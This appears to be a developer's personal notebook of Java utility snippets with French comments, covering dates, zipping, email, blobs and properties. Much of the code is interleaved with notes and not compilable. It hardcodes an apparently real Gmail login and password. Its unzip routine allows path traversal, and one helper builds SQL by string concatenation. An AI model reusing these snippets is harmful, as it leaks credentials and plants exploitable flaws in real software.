	 * Check if a string is a date according to the given pattern. (expression reguliere de date)
	 * 
	 * @param input String
	 * @param df SimpleDateFormat
	 * @return boolean
	 */
	public static boolean isDateValid(String input,SimpleDateFormat df) {
  		boolean isValid = false;
  		ParsePosition pos = new ParsePosition(0);
  		df.setLenient(false); // ca veut dire que si je mets par ex le 32 janvier il va renvoyer une erreur. Si c lenient il rectifie en mettant le 1er fev.
  		try {
  			Date date = df.parse(input,pos);
  			//Test si la chaine est vide ou n'a pas ete lue totalement.
  			isValid = (date==null || pos.getIndex()<input.length()) ? false : true;
  		} catch (Exception e) {
  			isValid = false;
  		}
  		return isValid;
	}
--------------------
	public final static String[] TBL_INVALIDS_CHARACTERS = {"\\", "/", ":", "*", "?", " \"", "<", ">", "|"};
		/**
	 * Check if the string doesn't contain invalid digits
	 * 
	 * @param String the string to control 
	 * @return true if the string contains an invalid digit, false otherwise.
	 */
	public static boolean isContainInvalidDigit(String str){
		boolean result = false;
		
		for (int i = 0; i < Constants.TBL_INVALIDS_CHARACTERS.length; i++) {
			if (str.contains(Constants.TBL_INVALIDS_CHARACTERS[i])){
				result = true;
				break;
			}
		}
		
		return result; 
		
	}
--------------------------------
returns a subtable of a table of string (sublist) sous liste soustabl sousar
public static String[] SubstrTableString(String[] value, int start , int end) throws Exception
	{
		String[] ret = new String[end-start];
		for (int i=0; i<value.length; i++)
		{
			if (i>=start && i<end)
			{
				ret[i-(start)]=value[i];
			}
		}
		return ret;
	}
	
meme chose mais cette fois avec un offset et un limit :          (offset = nombre d'elements ignores en debut de liste) 
        public static WECM53_STORAGE_CONTROL[] SubstrTableString(WECM53_STORAGE_CONTROL[] value, int offset , int limit) throws Exception
    	{
        	WECM53_STORAGE_CONTROL[] ret = new WECM53_STORAGE_CONTROL[limit];
    		for (int i=0; i<value.length; i++)
    		{
    			if (i>=offset && i<limit+offset)
    			{
    				ret[i-(offset)]=value[i];
    			}
    		}
    		return ret;
Sinon on peut aussi faire ca sublist subtable subarr:
      WECM55_STORAGE_IAO_CONTROL[] res =  (WECM55_STORAGE_IAO_CONTROL[]) pm.detachCopyAll(allProducts).toArray(new WECM55_STORAGE_IAO_CONTROL[0]);
			List<WECM55_STORAGE_IAO_CONTROL> l = Arrays.asList(res);
			WECM55_STORAGE_IAO_CONTROL[] resret = l.subList(config.getOffset(), config.getOffset()+config.getLimit()).toArray(new WECM55_STORAGE_IAO_CONTROL[0]);
	--------------------------------
private static final String MYSQL_DATE_FORMAT = "yyyy-MM-dd";
pour convertir une Date en texte
	/**
	 * @param date Java Date instance 
	 * @return return a formatted date following MySql pattern 
	 * yyyy-MM-dd HH:mm:ss 
	 */
	public static String getMySqlDateFormat (Date date) {
		
		SimpleDateFormat sdf = new SimpleDateFormat(Utils.MYSQL_DATE_FORMAT); ("HH:mm:ss dd/MM/yyyy")              HH pour 24h sinon hh pour 12hampm // attention n'est pas threadsafe.
		String strDate ="";
		
		// Using Calendar as Date methodes are  deprecated
		Calendar calendar = Calendar.getInstance(); 
		calendar.setTime(date);
		
		strDate = sdf.format(calendar.getTime());
		
		return strDate;
	}
----------------
	/**
	 * Transform a Date into a String with the given format
	 * 
	 * @param dateToFormat
	 * @param format
	 */
	public static String getFormatedDate(Date dateToFormat, String format){
		SimpleDateFormat form = new SimpleDateFormat(format); // attention n'est pas threadsafe.
		return form.format(dateToFormat);
	}
	--------------------------------
	/**
	 * 
	 * <strong>Object</strong> supposed to convert all kind of objects to appropriate string
	 *
	 * @author Duverge Laurent
	 * @since 19 nov. 09
	 * @param an Object that can be null or a string or a BigDecimal
	 * @return String value of the object
	 * @throws Exception
	 */
	public static String fieldToString(Object a) throws Exception
	{
//		System.out.println(a.getClass().getCanonicalName());
		String b = Constants.EMPTY;
		
		if (a.getClass().isInstance(new String())) linkinstanceof
		{
			b = (String)a;
		}
		else if (a ==null)
		{
			b=Constants.NULL;
		}
		else if (a.getClass().getCanonicalName().contains("BigDecimal"))
		{
			b = ((BigDecimal)a).toString();
		}
		b=b.equals(Constants.NULL)?Constants.EMPTY:b;
		return b;
	}
	--------------------------------
	/**
	 * 
	 * <strong>Object</strong> convert a list of string into something like "'a','b','c'" (pour les in  pour faire des in , pour faire un in )
	 StringUtils.collectionToDelimitedString(uneListeDeString, "toto") // toto est le separateur.	 
	 Avant je faisais comme ça:
	 * @author Duverge Laurent
	 * @since 19 nov. 09
	 * @param parametre1 Saisir explication du paramètre 1. Au moins un caractère dont espace.
	 * @return Saisir explication de ce que renvoi la methode Exemple Saisir exemple renvoit
	 * @throws typeException commentaire
	 */
    	public static String convertListToSqlInCriteria(List<String> valueList)throws Exception
    	{
    		StringBuffer ipns = new StringBuffer();
    		String ret=Constants.EMPTYQUOTES;
    		if (valueList.size()>0)
    		{
    		ipns.append("'");
    		for (String ipn : valueList)
    		{
    			ipns.append(ipn);
    			ipns.append("','");
    		}
    		int size = ipns.toString().length();
    		ret= ipns.toString().substring(0,size-2);
    		}
    		return ret;
    	}
    }
ou bien ca: 
        sql.append("DELETE FROM R0813_PREAVIS WHERE R0813IDPARENT IN (");
        
        			for (int i = 0; i < preNoticeIds.length; i++) {
        				sql.append((i > 0) ? ",?" : "?");
        			}
        
        			sql.append(")");
--------------------------------
pour supprimer les doublons d'une liste: (c'est pas forcement LinkedList ca peut etre une autre type de liste)
			public LinkedList removeDuplicates(LinkedList liste)
				{
				    Set set = new HashSet() ;
				    set.addAll(liste) ;
				    LinkedList distinctList = new LinkedList(set) ;
				    return distinctList;
				}
				pour etre sur que ca marche sur des objets il faut  override equals and hashcode for your class
				sinon faire
          				private static List<EmployeeReport> duplicateDeletion(List<EmployeeReport> warnings) {
          		java.util.Vector<String> matcles = new Vector(warnings.size());
          			Iterator it = warnings.iterator();
          			while (it.hasNext())
          			{
          				EmployeeReport sce = (EmployeeReport)it.next();
          				if (matcles.contains(sce.getEmployeeId().getMatcle()))
          				{
          					it.remove();
          				}
          				else
          				{
          					matcles.add(sce.getEmployeeId().getMatcle());
          				}
          
          			}
          			return warnings;
          		}
	Autre facon plus moche : 
            	java.util.Vector vecResD = cmd.getVecResult() ;			
            			java.util.Vector vecRes =null;
            			// suppression doublons à faire en java
            			if (vecResD!=null && vecResD.size()>1)
            			{
            				vecRes = new Vector(vecResD.size());
            				Iterator it = vecResD.iterator();
            				String prevId="";
            				while (it.hasNext())
            				{
            					SceInf sce = (SceInf)it.next();
            					if (!prevId.equals(sce.getId()))
            					{
            						vecRes.add(sce);
            					}
            					prevId=sce.getId();
            				}
            			}
            			// fin suppression doublons
            			
				--------------------------------
pour zipper un fichier:
													static final int BUFFER = 2048;
														byte data[] = new byte[BUFFER];
														public void createArchive (String excelFolder, String fileName, String zipFolder, String zipName) throws FileNotFoundException {
															FileOutputStream destination = new BufferedOutputStream(new FileOutputStream(newFile(zipFolder + File.separator(c'est le slash adequat separateur) + zipName))); // on peut ecrire à la suite dans le fichier en rajouter un argument "append" à true
															BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(destination);
															ZipOutputStream zipOutputStream = new ZipOutputStream(bufferedOutputStream);
															zipOutputStream.setMethod(ZipOutputStream.DEFLATED);
															zipOutputStream.setLevel(9);
															File file = new File(excelFolder + fileName);		
															FileInputStream fileInputStream = new FileInputStream(file);
															BufferedInputStream bufferedInputStream = new BufferedInputStream(fileInputStream, BUFFER);
															ZipEntry zipEntry = new ZipEntry(fileName);
															try {
																zipOutputStream.putNextEntry(zipEntry);
																int count;
																while((count = bufferedInputStream.read(data, 0, BUFFER)) != -1) {
																	zipOutputStream.write(data, 0, count);
																}
																zipOutputStream.closeEntry();
																bufferedInputStream.close();
																zipOutputStream.close();
															} catch (IOException e) {
																e.printStackTrace();
															}
														}
pour dezipper un fichier:
        private void Unzip(File aspFile, File destFolder) throws Exception 
      	{
      		try 
      		{
      			BufferedOutputStream dest = null;
      			FileInputStream fis = new FileInputStream(aspFile);
      			ZipInputStream zis = new ZipInputStream(new BufferedInputStream(fis));
      			ZipEntry entry;
      			while((entry = zis.getNextEntry()) != null) 
      			{
      				log.debug("Laurent: extracting : "  +entry + " to : " + destFolder.getPath().concat(File.separator.concat(entry.getName())));
      				int count;
      				byte data[] = new byte[BUFFER];
      				// write the files to the disk
      				FileOutputStream fos = new FileOutputStream(destFolder.getPath().concat(File.separator.concat(entry.getName()))); // on peut ecrire à la suite dans le fichier en rajouter un argument "append" à true
      				dest = new BufferedOutputStream(fos, BUFFER);
      				while ((count = zis.read(data, 0, BUFFER))!= -1) 
      				{
      					dest.write(data, 0, count);
      				}
      				dest.flush(); //Flushes this output stream and forces any buffered output bytes to be written out.
      				dest.close();
      			}
      			zis.close();
      
      		}
      		catch (Exception e)
      		{
      			throw e;
      		}
      	}

on peut avoir un access denied ou access refuse  acces refuse Accès refuse on fait :
                    FileInputStream fileInputStream = new FileInputStream(file); c parce que file est un repertoire je crois...
pour copier un repertoire de manière recursive:
    FileUtils.copyDirectory(srcDir, destDir) (de apache: <dependency>	<groupId>org.apache.commons</groupId>	<artifactId>commons-io</artifactId>	<version>1.3.2</version></dependency>            ) 
Pour zipper un repertoire de maniere recursive: 
                                  	public void startCreateArchive(String folderToZip, String pathOfZipFileToCreate) throws Exception
                                  	{
                                  	   //create a ZipOutputStream to zip the data to 
                                      ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(pathOfZipFileToCreate)); // on peut ecrire à la suite dans le fichier en rajouter un argument "append" à true
                                  	zos.setMethod(ZipOutputStream.DEFLATED);
                                  	zos.setLevel(9);
                                      //assuming that there is a directory named inFolder (If there 
                                      //isn't create one) in the same directory as the one the code runs from,
                                      //call the zipDir method 
                                      createArchive(folderToZip, zos); 
                                      //close the stream 
                                      zos.close();
                                  	}
                                  	private void createArchive (String dir2zip, ZipOutputStream zos) {
                                  		{ 
                                  			  try 
                                  			   { 
                                  			        //create a new File object based on the directory we have to zip File    
                                  			           File zipDir = new File(dir2zip); 
                                  			        //get a listing of the directory content 
                                  			        String[] dirList = zipDir.list(); 
                                  			        byte[] readBuffer = new byte[2156]; 
                                  			        int bytesIn = 0; 
                                  			        //loop through dirList, and zip the files 
                                  			        for(int i=0; i<dirList.length; i++) 
                                  			        { 
                                  			            File f = new File(zipDir, dirList[i]); 
                                  			        if(f.isDirectory()) 
                                  			        { 
                                  			                //if the File object is a directory, call this 
                                  			                //function again to add its content recursively 
                                  			            String filePath = f.getPath(); 
                                  			            createArchive(filePath, zos); 
                                  			                //loop again 
                                  			            continue; 
                                  			        } 
                                  			            //if we reached here, the File object f was not a directory 
                                  			            //create a FileInputStream on top of f 
                                  			            FileInputStream fis = new FileInputStream(f); 
                                  			            //create a new zip entry 
                                  			        ZipEntry anEntry = new ZipEntry(f.getPath()); 
                                  			            //place the zip entry in the ZipOutputStream object 
                                  			        zos.putNextEntry(anEntry); 
                                  			            //now write the content of the file to the ZipOutputStream 
                                  			            while((bytesIn = fis.read(readBuffer)) != -1) 
                                  			            { 
                                  			                zos.write(readBuffer, 0, bytesIn);
                                                        a titre d'exemple :pour convertir en char: si strContent est un StringBuffer: strContent.append((char) bytesIn);  
                                  			            } 
                                  			           //close the Stream 
                                  			           fis.close(); 
                                  			    } 
                                  			} 
                                  			catch(Exception e) 
                                  			{ 
                                  			    //handle exception 
                                  			} 
                                  
                                  
                                  	}
                                  	}
--------------------------------
pour verifier que tout est en Maj :
                        public boolean isAllUpper(String string) throws Exception {
                        		boolean ret=false;
                        		for (int i=0; i<string.length(); i++)
                        		{
                        			if (Character.isUpperCase(string.charAt(i)))
                        			{
                        				ret=true;
                        				
                        			}
                        			else if (!Character.isLetter(string.charAt(i)))
                        			{
                        				ret=true;
                        			}
                        			else if (Character.isSpaceChar(string.charAt(i)))
                        			{}
                        			else
                        			{
                        				ret=false;
                        				break;
                        			}
                        		}
                        			
                        		return ret;
                        	}

pour supprimer tous les caractères non ascii(chelous) :
            String convertToASCII(String toTrim) throws Exception
            	{
            		CharsetEncoder e = Charset.forName("US-ASCII").newEncoder(); 
            		StringBuilder ret = new StringBuilder();
            		char[] a = toTrim.toCharArray();
            		for(int i =0; i<a.length; i++)
            		{
            			if (e.canEncode(a[i]))
            			{
            				ret.append(a[i]);
            			}
            		}
            				return ret.toString();
            	}                        	
pour supprimer les caracteres trop chelous d'un string:
              premiere methode:
              public String removeAllNonChar(String string) throws Exception 
                      	{
                      		StringBuffer ret = new StringBuffer();
                      		for (int i =0; i<string.length(); i++)
                      		{
                      			if (Character.isLetter(string.charAt(i)))
                      			{
                      				ret.append(string.charAt(i));
                      			}
                      		}
                      		return ret.toString();
                      	}
               deuxeme methode: 
										/**
										 * <strong>Objectif</strong> Supprimer les caractères que le parseur XML ne pourras pas supporter
										 * @author Duverge Laurent
										 * @since 16 juil. 08
										 * @param String donnee a traitee: on supprime les char de type 15
										 * @return Un string sans les caracteres mal supportes
										 */
										public static String removeCharType15(String data)
										{
											StringBuffer result=new StringBuffer();
											char[] chars = data.toCharArray();
											for (int i=0;i<chars.length;i++)
											{
												if(Character.getType(chars[i])!=15) result.append(chars[i]);
											}
											return result.toString();
										}
__________________
pour detecter supprimer tous les caracteres non iso: 
   public boolean hasAccentuatedChar(String string) {
      		   String sSansAccent;
      		   StringBuffer sb = new StringBuffer("&'(-_ç)=}]@^`|[|{\\\"'^$£¨ùµ*%!§:/;.,?<>");
      		   for (int i =0; i<sb.length(); i++)
      		   {
      			   if (string.indexOf(sb.charAt(i))>-1) return true;
      		   }
      		   
      		try 
      		{
      			sSansAccent = new String(string.getBytes(), "US-ASCII" );
      		}
      		catch (UnsupportedEncodingException e) 
      		{
      			return true;
      		}
      		   if (sSansAccent.equals(string))   return false; 
      		   else return true;
      	}
supprimer les accents :
		public String removeAccents(String var) 
		{
			logger.debug("withAccent: "+var);
	        StringBuilder sb = new StringBuilder(var.length());
	        var = Normalizer.normalize(var, Normalizer.Form.NFD);
	        logger.debug("normalized: "+var);
	        for (char c : var.toCharArray()) {
	            if (c <= '\u007F') sb.append(c);
	        }
	        logger.debug("withoutAccent: "+sb.toString());
	        return sb.toString();
		}

      	
--------------------------------
pour avoir le numero de la semaine en fonction d'une date.
    * si null est passe , la date du jour est prise en compte
    * @param madate
    * @return int (numero de semaine de l'annee) // ou possibilite d'avoir numero du jour de la semaine
    */
   public static final int getNosem(Date madate) {
       /*
       Pour faire des tests:
       GregorianCalendar toto = new GregorianCalendar(2010,0,4);
       madate= toto.getTime();*/
       int result;
       Calendar calendar = Calendar.getInstance();
       calendar.setLenient(false);

       try{
           calendar.setMinimalDaysInFirstWeek(4);
           calendar.setFirstDayOfWeek(Calendar.MONDAY);
           calendar.setTimeInMillis(madate.getTime());
           result = calendar.get(Calendar.WEEK_OF_YEAR);// ou DAY_OF_WEEK si on veut avoir le jour de la semaine
       } catch(IllegalArgumentException iAE) {
           result = calendar.get(Calendar.WEEK_OF_YEAR);// ou DAY_OF_WEEK si on veut avoir le jour de la semaine
       } catch(Exception e) {
           result = calendar.get(Calendar.WEEK_OF_YEAR); // ou DAY_OF_WEEK si on veut avoir le jour de la semaine
       }
       return result;       }
--------------------------------
pour envoyer un mail avec une piece jointe: Plutot que ca, avec spring c'est plus facile. Voir http://docs.spring.io/spring/docs/current/spring-framework-reference/html/mail.html
import javax.mail.Message;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeUtility;

	    // Creation d'un message
	    Properties props = new Properties();
			props.put("mail.smtp.host", mailSmtp); // ou mailSmtp: wsmtp.renault.fr
			props.put("mail.debug", "true"); // si besoin quand ca marche pas
			
			Session session = Session.getDefaultInstance(props, null);
			session.setDebug(true); // pour comprendre pourquoi ca ne marche pas sinon mettre:
			session.setDebug(false);
	    Message messageAdm = new MimeMessage (session);
	    // Modification de l'expediteur
	    messageAdm.setFrom (new InternetAddress (from));
	    // Modification du destinataire
	    String AdressMailAdmin = AdminIterator.next().toString();
	    InternetAddress [] addressadm =  {new InternetAddress (AdressMailAdmin)};
	    messageAdm.setRecipients (Message.RecipientType.TO, addressadm);
	    // Modification du sujet
	    messageAdm.setSubject (subjectadm);
	    attention: il se peut qua cause de l'environnement le header dont le subjet soit mal encode et on a des choses du style =?ANSI_X3.4-1968?Q?GDV-_Demande_de_validation_d'entr=3Fe_d'un_visiteur?= 
      dans ce cas peut etre fair ca plutot 
	     message.setSubject(MimeUtility.encodeText(monSubjectAvecDesCaracteresAccentues, "utf-8", null));
	    //contenu message administrateur: corp du message
	    String  contentadm = "Ci joint les logs du jour.";
	    String Dir = DirMail.substring(0,21);
	    Multipart multipart = new MimeMultipart();
	    DataSource source = new FileDataSource(Dir+"logparse.txt");
	//    if (fichier_analyser.exists())
	    //   {
	//      DataSource source3 = new FileDataSource(fichier_analyser);
	    DataSource source3 = new FileDataSource(Dir+"logbord.txt");
	    BodyPart messageBodyPart3 = new MimeBodyPart();
	    messageBodyPart3.setDataHandler(new DataHandler(source3));
	    messageBodyPart3.setFileName("logbord.txt");
	    multipart.addBodyPart(messageBodyPart3);
	//    }
	    BodyPart messageBodyPart = new MimeBodyPart();
	    BodyPart messageBodyPart2 = new MimeBodyPart();
	    messageBodyPart2.setContent(contentadm.toString(), "text/plain"); (ou "text/html")
	    
	    
	             si ça ne marche pas au format text/html essayer come ca : 
                  			DataHandler.setDataContentHandlerFactory( new WecFonction().new UtlMailContentFactory() );
                  			msg.setDataHandler(new DataHandler(new ByteArrayDataSource(message.toString(), "text/html")) );
                  					//msg.setText(message);
                  			msg.setSentDate(new java.util.Date());
                        
                        avec : 
                              public class UtlMailContentFactory implements DataContentHandlerFactory {
                              
                              	public UtlMailContentFactory() {
                              	}
                              	public DataContentHandler createDataContentHandler( String parm1 ) {
                              	if( parm1.equalsIgnoreCase( "text/plain") )
                              	return new com.sun.mail.handlers.text_plain();
                              	else if ( parm1.equalsIgnoreCase( "text/html" ) )
                              	return new com.sun.mail.handlers.text_html();
                              	else
                              	return null;
                              	}
                              	}
	    
	    
	    messageBodyPart.setDataHandler(new DataHandler(source));
	    messageBodyPart.setFileName("logparse.txt");
	    multipart.addBodyPart(messageBodyPart);
	    multipart.addBodyPart(messageBodyPart2);
	    // si le fichier est tronque a la reception (truncated tronque) utiliser cette methode:
 					 MimeBodyPart mbp2 = new MimeBodyPart();
					 FileDataSource fds = new FileDataSource(attachment);
					 mbp2.setDataHandler(new DataHandler(fds));
					 mbp2.setFileName(attachment.getName());
					 multipart.addBodyPart(mbp2);
	  //FIN si le fichier est tronque a la reception (truncated tronque) utiliser cette methode:
	    messageAdm.setContent(multipart);
	    Transport.send (messageAdm);
	    cat.info("Message envoye a administrateur "+AdressMailAdmin);
pour envoyer un mail simple avec javax.mail et qu'on a eu un message d'erreur de non authentification ou probleme startttssslchaispas quoi :
					Properties props = new Properties();
					props.put("mail.smtp.host", "smtp.googlemail.com");
					props.put("mail.smtp.starttls.enable", "true");
//					 props.put("mail.user", "kanailaurent@gmail.com");
//					 props.put("mail.password", "calottezoclos");
					props.put ("mail.smtp.auth","true");
					props.setProperty("mail.smtp.submitter", authenticator.getPasswordAuthentication().getUserName());
					//properties.setProperty("mail.smtp.port", "25");
					javax.mail.Session mailSession =javax.mail.Session.getDefaultInstance(props, authenticator);
					avec
          static MyAuthenticator authenticator = new StartParse().new MyAuthenticator();
              	private class MyAuthenticator extends javax.mail.Authenticator 
               	 {
               		 private PasswordAuthentication authentication;
               		 public MyAuthenticator() 
               		 {
               		 String username = "kanailaurent@gmail.com";
               		 String password = "calottezoclos";
               		 authentication = new PasswordAuthentication(username, password);
               		 }
               		 protected PasswordAuthentication getPasswordAuthentication() 
               		 {
               		  return authentication;
               		 }
               	 }					
--------------------------------
pour envoyer un mail simple avec apache mail : librairie dispo ici: http://commons.apache.org/email/download_email.cgi
      Email email = new SimpleEmail();
      email.setHostName("smtp.googlemail.com");
      email.setSmtpPort(465);
      email.setAuthenticator(new DefaultAuthenticator("username", "password"));
      email.setSSLOnConnect(true);
      email.setFrom("user@gmail.com");
      email.setSubject("TestMail");
      email.setMsg("This is a test mail ... :-)");
      email.addTo("foo@bar.com");
      email.send();

pour ecrire un blob dans un fichier: (attention, si on arrive pas a lire le fichier peut etre qu'il a ete zippe avant d'etre mis dans la base? hahah)
		public static void tableauDeBytesVersFichier (byte[] tableau, java.io.File fichier) throws Exception {
			java.io.FileWriter f = new java.io.FileWriter(fichier);
			//on itère sur chaque element, car il n'y a pas de fonction globale
			for (int i = 0; i < tableau.length; i++)
				f.write(tableau[i]);
			f.close();
		}
Image -> blob: 
            public void sauveIMG(String location, String name) throws Exception 
            {
              File monImage = new File(location);
              FileInputStream istreamImage = new FileInputStream(monImage);
              try 
              {
                PreparedStatement ps = conn.prepareStatement("insert into image (name, img) values (?,?)");
                try 
                {
                    ps.setString(1, name);
                    ps.setBinaryStream(2, istreamImage, (int) monImage.length());
                    ps.executeUpdate();
                }
                finally 
                {
                  ps.close();
                }
              } 
              finally 
              {
                istreamImage.close();
              }
            }
blob -> Image:
          public void chargeIMG(String name, String location) throws Exception
          {
            File monImage = new File(location);
            FileOutputStream ostreamImage = new FileOutputStream(monImage); // on peut ecrire à la suite dans le fichier en rajouter un argument "append" à true
                      
            try
            {
              PreparedStatement ps = conn.prepareStatement("select img from image where name=?");
          
              try
              {
                ps.setString(1,name);
                ResultSet rs = ps.executeQuery();
                
                try
                {
                  if(rs.next())
                  {
                	  InputStream istreamImage = rs.getBinaryStream("img");
                
                	  byte[] buffer = new byte[1024];
                	  int length = 0;
          	
                	  while((length = istreamImage.read(buffer)) != -1)
                	  {
                	    ostreamImage.write(buffer, 0, length);
          	  }
            	}
                }
                finally
                {
                  rs.close();
                }
              }
              finally
              {
                ps.close();
              }
            }
            finally
            {
              ostreamImage.close();
            }
          }
	--------------------------------
convertir une date en string:
						static Date actuelle = new Date();
						static DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd"); // attention n'est pas threadsafe.
						String dat = dateFormat.format(actuelle);
exemple genial qui marche de fonction pour formater une date: 
					 public static String formatDate(String date, String startPattern("dd/MM/yy"), String endPattern("yyyy-MM-dd")) throws Exception
						{
							SimpleDateFormat formatter = new SimpleDateFormat(startPattern); // attention n'est pas threadsafe.
							Date after = formatter.parse(date);
							SimpleDateFormat dateFormat = new SimpleDateFormat(endPattern);
							String dat = dateFormat.format(after);
							log.debug("formatter before: " + date + "after :"+dat);
							return dat;
						}
exemple pour autoformater une string de date en DATE dans tous les cas possibles de pattern de date qui arrivent: (trois methodes super utiles a reutiliser dans un Utils)
								private static String formatDate(String date, String startPattern, String endPattern) throws Exception
									{
										SimpleDateFormat formatter = new SimpleDateFormat(startPattern);
										Date after = formatter.parse(date);
										SimpleDateFormat dateFormat = new SimpleDateFormat(endPattern);
										String dat = dateFormat.format(after);
										log.debug("formatter before: " + date + "after :"+dat);
										return dat;
									}
									private static String formatDate(String date, String endPattern) throws Exception
									{
										
										Date after = autoParseDate(date);
										SimpleDateFormat dateFormat = new SimpleDateFormat(endPattern);
										String dat = dateFormat.format(after);
										log.debug("formatter before: " + date + "after :"+dat);
										return dat;
									}
									
									public static Date autoParseDate(String date) throws Exception
									{
										Date ret = new Date();
										if (date!=null && (date.length()==8 || date.length()==10))
										{
											try
											{
												SimpleDateFormat formatter = new SimpleDateFormat();
												
												if(date.length()==8) formatter = new SimpleDateFormat("dd/mm/yy");
												else if(date.length()==10) formatter = new SimpleDateFormat("yyyy-MM-dd"); ou HH:mm:ss dd/MM/yyyy
												try
												{
													ret = formatter.parse(date);	
												}
												catch (Exception e)
												{
													formatter = new SimpleDateFormat("dd/mm/yyyy");
													try
													{
														ret= formatter.parse(date);
													}
													catch(Exception e1)
													{
														throw e1;
													}
												}
											}
											catch (Exception e)
											{
												StringWriter sw = new StringWriter();
												PrintWriter pw = new PrintWriter(sw, true);
												e.printStackTrace(pw);
												pw.flush(); //Flushes this output stream and forces any buffered output bytes to be written out.
												sw.flush();
												log.error(sw.toString());
												throw e;
											}
										}
										return ret;
									}
--------------------------------
Pour formater un chiffre: taille zeros string 
numberTest = 1;
private static DecimalFormat  nf = new DecimalFormat("000" ); ou "00.000" ou "##.###" (dans ce dernier cas c pas pareil: je crois que les zero apres virgules ne s'affichent pas si c'est zero)
            decimalformat peut etre remplacé par string.format pour ecrire les millions  String.format("%.2fM", theNumber/ 1000000.0); ou String.format("%,.2f",totalNPV) LINKStringFOrmatNumb 
String retour =code.concat(nf.format(numberTest));
retour va etre egal à 001
--------------
proprietes : properties :
pour lire charger recuperer les properties proprietes d'un fichier de configuration dans un batch java: (voir aussi ci dessous PropertyResourceBundle) 
public static void loadProperties () throws Exception {
		InputStream is = MaClaseActuelle.class.getClassLoader().getResourceAsStream (Constants.PROPERTIES_FILE); // KO en java9 voir LINKgetRes9 le fichier de propriete doit etre dans le classpath verifier avec System.out.println("CLASSPATH: " + System.getProperty("java.class.path")); System.out.println("ClassLoader resource path: " + HRParameters.class.getClassLoader().getResource("hr-openhr-for-ta.properties")); System.out.println("ClassLoader resource path: " + ClassLoader.getSystemResourceAsStream("hr-openhr-for-ta.properties"));
		ou                                                    "." on peut mettre ça. 
    String path = this.getClass().getClassLoader().getResource("users.xml").getPath(); // KO en java9 voir LINKgetRes9. pour avoir le path d'un fichier de propriete sous resources
		if (null == is ) {
			throw new Exception ("Cann't find properties file");
		}
		Properties properties = new Properties();
		properties.load(is);
		PtlInitialize.commandFile = properties.getProperty("command").trim();
		PtlInitialize.filelock = properties.getProperty("lock").trim();
		PtlInitialize.interval = Long.parseLong(properties.getProperty("lock_interval").trim());
		on peut utiliser String toto = StrSubstitutor.replaceSystemProperties("un texte avec ${uneproprietesysteme} blabla"); // pour resoudre les properties proprietes systeme environnement ${catalina.out} par exemple
		      est dans
		                <dependency>
                    <groupId>org.apache.commons</groupId>
                    <artifactId>commons-lang3</artifactId>
                    <version>3.5</version>
                    </dependency>
		ATTENTION! NE PAS OUBLIER DE FERMER TOUT (close) A LA FIN et (peut etre) d'en faire un singleton sinon on va avoir l'erreur: too many file opened
		
si ces proprietes sont externalisees du classpath : 
FileInputStream fis = new FileInputStream("c:/temp/mybundle.txt"); //si je met juste un nom de fichier il va le chercher au meme niveau que le jar qui est executé
try {
  PropertyResourceBundle configurations= new PropertyResourceBundle(fis); // aucun problème d'accent avec ça (sauf si html peutetre utiliser &eacute;) par contre les ":" (deux points)à gauche doivent etre remplaces par "\:"
  buffer = configurations.getString("APP_NAME");
} finally {
  fis.close();
}
pour sauver ecrire dans le fichier properties proprietes : 
    				FileWriter fw = new FileWriter (PATH);
    				props.store(fw, "unCommentaireSertARien");
	       			fw.close();		
....
--------------------------------
erreurs exception java: faire un e.printStackTrace() linkgetStringStackTrace pour avoir plus de details sur l'erreur java. afficher le stacktrace depuis java9 utiliser StackWalker
		mais pour le printer dans un log faire: 
					StringWriter sw = new StringWriter();
	        PrintWriter pw = new PrintWriter(sw, true);
	        e.printStackTrace(pw);
	        pw.flush();
	        sw.flush(); //Flushes this output stream and forces any buffered output bytes to be written out.
	        log.error(sw.toString());
   ou mieux si on utilise log4j:
   	logger.error(ex, ex); ca fait un stacktrace voir afficher imprimer
--------------------------------
/**
	 * Convert a File to a the CSV format
	 * 
	 * @param file File file to convert
	 * @return CSVReader : the file in the CSV format
	 */
	public static CSVReader convertToCSV(String path) {
		//initialize the log4j logger
		Logger loggerPle = Logger.getLogger(Constants.APP_NAME);
		
		CSVReader csvReader = null;
		FileInputStream fileInputStream = null;
		InputStreamReader inputStreamReader = null;
		File scrFile = new File(path);

		if ((null == scrFile) || (!scrFile.canRead())){
			loggerPle.info("The file doesn't exist : " + path);
		}else{
			try {
				fileInputStream = new FileInputStream(scrFile);
				
				/** read file as UTF-8 charset */
				inputStreamReader = new InputStreamReader(fileInputStream, Constants.ISO_8859_1); le fichier qu'on lit doit etre de l'iso
	
				/** read csv file with separator as parameter */
				csvReader = new CSVReader(inputStreamReader, Constants.FIELDS_SEPARATOR);
				csvReader.readNext();
				// parcourir : 
				    String[] cols = new String[]{};
    			 while ((cols = csvReadingFile.readNext()) != null) {
    			{
    			 ...
    			}
			} catch (CharacterCodingException mie) {
				//the file is not in the expected charset
				loggerPle.info("The file is not in the expected charset : " + path);
				csvReader = null;
			} catch (IOException ioe) {
				loggerPle.info("PLE --- FilesImportProcess IOException : " + ioe.getMessage());
				csvReader = null;
			} catch (Exception e) {
				loggerPle.info("PTL --- FilesImportProcess Exception : " + e.getMessage());
				csvReader = null;
			}	
		}

		return csvReader;
---------------------------
	/**
	 * 
	 * @param date
	 * @return String : returns the current in the format : YYYYSS 
	 */
	public static String getDateForFileName(Date date) {
		GregorianCalendar calendar = new GregorianCalendar();
		if (date != null) {
			calendar.setGregorianChange(date);
		}
		return (""+calendar.get(Calendar.YEAR)+""+precedByZerosForLenght(calendar.get(Calendar.WEEK_OF_YEAR),2));
------------------------------
	/**
	 * Return a string representation of a java.sql.timestamp object 
	 */
	public static String sqlTimestampToString (Object date)  {
		try {
			if (null == date) {
				return "";
				
			} else{
				Timestamp time = (Timestamp) date;
				return time.toString();
			}
			
		} catch (Exception e) {
			return "";
		}
	}
------------------------------------
	/**
	 * Return a string representation of a java.sql.time object
	 */
	public static String sqlTimeToString (Object date)  {
		try {
			if (null == date) {
				return "";
				
			} else{
				Time time = (Time) date;
				return time.toString();
			}
			
		} catch (Exception e) {
			return "";
		}
	}
------------------------------------
	/**
	 * Return a string representation of a a number and concat "0" in the beggining of this string returned
	 * so that the string have the lenght of "lenght" parameter
	 * @param date Object
	 * @return a string representation of a int
	 */
	public static String precedByZerosForLenght(int number , int lenght )// regarder plutot DecimalFormat
	{                                                                    
		String numberWithZeros=Integer.toString(number);                   
